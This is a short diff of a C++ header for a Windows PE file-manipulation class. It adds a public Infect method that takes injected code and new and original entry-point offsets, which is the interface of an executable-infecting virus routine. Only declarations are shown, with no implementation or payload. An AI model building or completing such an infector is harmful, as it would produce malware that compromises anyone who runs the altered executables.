@@ -16,8 +16,8 @@ public:
 	void Save(void) const;
 	void SaveAs(char const* filePath) const;
 
-	void ExpandLastSection(size_t size);
-	void AppendLastSection(char const* data, size_t size);
+	void Infect(char const* code, size_t size, DWORD newEntryPointOffset, DWORD originalEntryPointOffset); 
+
 
 	size_t GetFileSize(void) const;
 	size_t GetNumberOfSections(void) const;
@@ -28,6 +28,9 @@ private:
 	void LoadFile(void);
 	void ReallocateBuffer(size_t size);
 	void UpdateHeaderPointers(void);
+	void ExpandLastSection(size_t size);
+	//void AppendLastSection(char const* data, size_t size);
+
 
 	std::string				m_filePath;
 	char*					m_fileBuffer;
